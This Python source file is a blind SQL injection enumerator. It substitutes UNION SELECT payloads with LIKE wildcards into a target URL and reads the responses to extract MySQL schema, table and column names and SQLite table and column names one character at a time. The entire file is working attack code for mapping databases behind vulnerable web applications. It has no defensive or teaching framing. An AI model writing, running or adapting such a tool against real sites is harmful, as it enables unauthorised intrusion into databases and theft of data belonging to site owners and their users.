from requests import request
from sys import exit


CHARS = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890_'


def enumerate(opts, poison, base_poison, known_list, name_alias):
    known_chars = ""
    verified = False

    while not verified:
        iteration_interrupted = False
        for char in CHARS:
            poison_str = poison + base_poison + known_chars + char + "%'"
            if known_list:
                poison_str += "".join(
                    [f" AND {name_alias} != '{e}'" for e in known_list]
                )
            poison_str += ";--"

            poison_url = opts.URL.replace("FUZZ", poison_str)
            response = request("get", poison_url).text

            if opts.SUCCESS_STR in response and opts.ERROR_STR in response:
                print(
                    '[x] Response reading ambiguous, try specifying response strings')
                exit(1)
            elif opts.SUCCESS_STR in response:
                known_chars += char
                iteration_interrupted = True
                break

        if not iteration_interrupted and known_chars != "":
            known_list.append(known_chars)
            known_chars = ""
        elif not iteration_interrupted:
            return known_list


class Sqlite_Enumerator():
    def enumerate_table(self, opts, poison):
        nulls = "".join([",null" for _ in range(opts.COLUMNS - 1)])
        base_poison = f"SELECT name{
            nulls} FROM sqlite_master WHERE type='table' AND name LIKE '"

        return enumerate(opts, poison, base_poison, [], "name")

    def enumerate_columns(self, opts, poison, table_name):
        nulls = "".join([",null" for _ in range(opts.COLUMNS - 1)])
        base_poison = (
            f"SELECT p.name{nulls} FROM sqlite_master AS m "
            f"JOIN pragma_table_info('{table_name}') AS p "
            f"WHERE m.type='table' AND p.name LIKE '"
        )

        return enumerate(opts, poison, base_poison, [], "p.name")


class Mysql_Enumerator():
    def enumerate_schemas(self, opts, poison):
        nulls = "".join([",null" for _ in range(opts.COLUMNS - 1)])
        base_poison = f"SELECT table_schema{
            nulls} FROM information_schema.tables WHERE "
        if not opts.INCLUDE_SYSTEM_TABLES:
            base_poison += "table_schema NOT IN ('information_schema', 'performance_schema', 'mysql', 'sys') AND "
        base_poison += "table_schema LIKE '"

        return enumerate(opts, poison, base_poison, [], "table_schema")

    def enumerate_table(self, opts, poison, schema_name):
        nulls = "".join([",null" for _ in range(opts.COLUMNS - 1)])
        base_poison = f"SELECT table_name{
            nulls} FROM information_schema.tables WHERE table_schema='{schema_name}' AND table_name LIKE '"

        return enumerate(opts, poison, base_poison, [], "table_name")

    def enumerate_columns(self, opts, poison, schema_name, table_name):
        nulls = "".join([",null" for _ in range(opts.COLUMNS - 1)])
        base_poison = (
            f"SELECT column_name{nulls} FROM information_schema.columns WHERE table_schema='{schema_name}' AND table_name='{
                table_name}' AND column_name LIKE '"
        )

        return enumerate(opts, poison, base_poison, [], "column_name")
